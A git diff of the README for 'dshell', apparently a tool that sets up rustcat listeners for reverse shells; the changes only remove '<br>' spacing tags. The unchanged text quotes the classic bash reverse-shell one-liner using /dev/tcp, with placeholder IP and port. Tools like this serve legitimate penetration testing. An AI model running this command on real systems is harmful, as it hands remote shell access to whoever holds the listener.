@@ -26,8 +26,6 @@ Ensure [rustcat](https://github.com/robiot/rustcat) is installed on your system.
 
 ## Usage
 
-<br>
-
 ### Help Menu
 
 ```sh
@@ -37,15 +35,12 @@ dshell -h
     /usr/local/bin/dshell -p <PORT> [IFACE|IP]
     /usr/local/bin/dshell -k <PORT|all>
 ```
-<br>
 
 ### Run a Listener
 
 ```sh
 dshell -p <PORT> [IFACE|IP]
 ```
-
-<br>
 
 Dshell will output the most commonly used reverse shell `bash -c 'bash -i >& /dev/tcp/IP/PORT 0>&1'` with the supplied IP and PORT
 If no interface or IP is supplied, Dshell will try the following interfaces in order:
@@ -55,8 +50,6 @@ If no interface or IP is supplied, Dshell will try the following interfaces in o
 * `wlan0`
 * `eth0`
 * `lo`
-
-<br>
 
 ### Kill Running Processes
 
